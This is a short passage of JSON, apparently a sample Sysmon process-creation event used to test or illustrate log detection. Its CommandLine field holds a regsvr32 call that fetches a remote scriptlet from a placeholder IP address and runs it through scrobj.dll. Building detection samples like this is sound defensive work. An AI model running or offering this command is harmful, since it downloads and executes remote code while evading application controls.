        "document": {
          "event": {
            "code": "1"
          },
          "winlog": {
            "channel": "Microsoft-Windows-Sysmon/Operational",
            "event_data": {
              "Image": "C:\\Windows\\System32\\regsvr32.exe",
              "CommandLine": "regsvr32.exe /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll"
